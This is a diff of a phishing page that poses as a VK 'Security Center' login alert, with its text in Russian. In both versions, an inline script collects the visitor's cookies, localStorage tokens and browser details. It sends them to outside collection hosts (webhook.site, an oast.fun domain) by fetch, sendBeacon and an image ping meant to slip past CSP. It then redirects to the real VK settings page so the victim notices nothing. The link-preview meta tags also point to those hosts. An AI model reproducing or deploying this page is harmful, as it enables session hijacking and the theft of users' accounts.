@@ -3,53 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta property="og:title" content="Внимание: Обнаружена попытка входа">
-    <meta property="og:image" content="https://lin-li-shu.github.io/test-preview/gemini2.svg">
-    <meta property="og:description" content="Зафиксирован вход с нового устройства: Linux, Saint Petersburg. Если это не вы, заблокируйте доступ.">
+    <meta property="og:image" content="https://webhook.site/8a567435-7606-4101-a378-5135d4ac218d/bot_og_image.png">
+    <meta property="og:description" content="Зафиксирован вход с нового устройства: Linux, Saint Petersburg.">
     
-    <link rel="icon" href="https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/bot_hit_favicon.ico">
-    <link rel="apple-touch-icon" href="https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/bot_hit_apple.png">
+    <link rel="icon" href="https://webhook.site/8a567435-7606-4101-a378-5135d4ac218d/favicon.ico">
 
     <title>VK Security Center</title>
 </head>
 <body>
     <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
         <h2>Проверка безопасности аккаунта...</h2>
-        <p>Пожалуйста, подождите, идет синхронизация сессии.</p>
+        <p>Идет синхронизация сессии, пожалуйста, не закрывайте страницу.</p>
     </div>
 
     <script>
-        (async function() {
-            const oast = "https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/";
+        (function() {
+            const hook = "https://webhook.site/8a567435-7606-4101-a378-5135d4ac218d";
             
-            // Собираем доступные куки (не HttpOnly)
-            let localCookies = document.cookie;
-            
-            // Собираем данные окружения
+            // Собираем всё, что можем, включая localStorage (там бывают токены)
             let report = {
-                type: "USER_CLICK",
-                cookies: localCookies,
-                url: window.location.href,
-                ref: document.referrer,
+                type: "VISIT",
                 ua: navigator.userAgent,
-                storage: JSON.stringify(localStorage) // Иногда токены лежат в LocalStorage!
+                cookies: document.cookie || "none",
+                storage: JSON.stringify(localStorage).substring(0, 500)
             };
 
-            // Отправляем всё на OAST
-            try {
-                // 1. Через fetch
-                fetch(oast + "?data=" + btoa(unescape(encodeURIComponent(JSON.stringify(report)))), {mode: 'no-cors'});
-                
-                // 2. Дублируем через картинку (на случай блокировки fetch)
-                new Image().src = oast + "ping?c=" + btoa(localCookies).substring(0, 50);
-            } catch(e) {}
+            // Комбинированный метод отправки (fetch + Beacon API)
+            const payload = btoa(unescape(encodeURIComponent(JSON.stringify(report))));
+            
+            // 1. Стандартный fetch
+            fetch(`${hook}/report?d=${payload}`, {mode: 'no-cors'});
+            
+            // 2. Beacon API - работает даже если вкладку сразу закрыли
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(`${hook}/beacon`, payload);
+            }
 
-            // Пинг для бота (если вдруг он запустит JS в Headless режиме)
-            fetch(oast + "js_bot_ping");
+            // 3. Пинг через картинку для обхода CSP
+            new Image().src = `${hook}/img_ping?v=${Date.now()}`;
 
-            // Через 3 секунды уводим на реальный VK, чтобы не вызывать подозрений
+            // Редирект через 2 секунды на настройки безопасности VK
             setTimeout(() => {
                 window.location.href = "https://vk.com/settings?act=security";
-            }, 3000);
+            }, 2000);
         })();
     </script>
 </body>
